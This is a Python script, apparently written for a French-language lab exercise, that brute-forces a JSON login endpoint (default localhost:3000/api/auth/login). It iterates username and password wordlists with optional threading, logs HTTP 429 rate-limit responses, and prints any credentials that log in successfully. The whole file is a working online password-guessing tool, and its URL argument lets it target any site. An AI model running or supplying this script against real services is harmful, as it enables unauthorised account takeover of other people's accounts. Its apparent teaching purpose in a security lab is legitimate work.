#!/usr/bin/env python3
import argparse
import json
import sys
from pathlib import Path
from typing import Iterable, Tuple
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

DEFAULT_URL = "http://localhost:3000/api/auth/login"

def load_lines(p: Path) -> Iterable[str]:
    with p.open("r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if line:
                yield line

def try_login(url: str, username: str, password: str, timeout: float = 5.0) -> Tuple[bool, int, str]:
    try:
        r = requests.post(
            url,
            headers={"Content-Type": "application/json"},
            data=json.dumps({"username": username, "password": password}),
            timeout=timeout,
        )
        if r.status_code == 200:
            return True, r.status_code, r.text
        return False, r.status_code, r.text
    except requests.RequestException as e:
        return False, -1, str(e)


def brute_single_user(url: str, username: str, passwords: Iterable[str], threads: int, stop_on_first: bool, timeout: float, verbose: bool):
    print(f"[+] Brute-force username={username} ...")
    successes = []
    if threads > 1:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = {ex.submit(try_login, url, username, pwd, timeout): pwd for pwd in passwords}
            for fut in as_completed(futures):
                pwd = futures[fut]
                ok, status, body = fut.result()
                if ok:
                    print(f"[SUCCESS] {username}:{pwd} (HTTP {status}) -> {body}")
                    successes.append((username, pwd))
                    if stop_on_first:
                        ex.shutdown(cancel_futures=True)
                        break
                else:
                    if verbose or status == 429:
                        preview = body[:200] if isinstance(body, str) else str(body)
                        print(f"[FAIL] {username}:{pwd} (HTTP {status}) -> {preview}")
    else:
        for pwd in passwords:
            ok, status, body = try_login(url, username, pwd, timeout)
            if ok:
                print(f"[SUCCESS] {username}:{pwd} (HTTP {status}) -> {body}")
                successes.append((username, pwd))
                if stop_on_first:
                    break
            else:
                if verbose or status == 429:
                    preview = body[:200] if isinstance(body, str) else str(body)
                    print(f"[FAIL] {username}:{pwd} (HTTP {status}) -> {preview}")
    return successes


def brute_users(url: str, usernames: Iterable[str], passwords: Iterable[str], threads: int, stop_on_first: bool, timeout: float, verbose: bool):
    successes = []
    passwords_list = list(passwords)
    for user in usernames:
        res = brute_single_user(url, user, passwords_list, threads, stop_on_first, timeout, verbose)
        successes.extend(res)
    return successes


def main():
    ap = argparse.ArgumentParser(description="Brute force POST /api/auth/login (TP)")
    ap.add_argument("--url", default=DEFAULT_URL, help=f"URL de l'endpoint (def: {DEFAULT_URL})")
    ap.add_argument("--username", help="Username unique à tester")
    ap.add_argument("--userlist", type=Path, help="Fichier de usernames (un par ligne)")
    ap.add_argument("--wordlist", type=Path, required=True, help="Fichier de mots de passe")
    ap.add_argument("--threads", type=int, default=1, help="Nombre de threads (def: 1)")
    ap.add_argument("--stop-on-first", action="store_true", help="Arrêter dès le premier succès")
    ap.add_argument("--timeout", type=float, default=5.0, help="Timeout HTTP par requête (def: 5.0s)")
    ap.add_argument("--verbose", action="store_true", help="Afficher le résultat de chaque appel (statut + corps)")
    args = ap.parse_args()

    if not args.username and not args.userlist:
        print("Erreur: précisez --username ou --userlist", file=sys.stderr)
        sys.exit(2)

    passwords = list(load_lines(args.wordlist))
    if not passwords:
        print("Wordlist vide.", file=sys.stderr)
        sys.exit(2)

    if args.username:
        successes = brute_single_user(args.url, args.username, passwords, args.threads, args.stop_on_first, args.timeout, args.verbose)
    else:
        usernames = list(load_lines(args.userlist))
        if not usernames:
            print("Userlist vide.", file=sys.stderr)
            sys.exit(2)
        successes = brute_users(args.url, usernames, passwords, args.threads, args.stop_on_first, args.timeout, args.verbose)

    if successes:
        print("\n=== Résultats ===")
        for u, p in successes:
            print(f"{u}:{p}")
        sys.exit(0)
    else:
        print("\nAucun mot de passe trouvé.")
        sys.exit(1)

if __name__ == "__main__":
    main()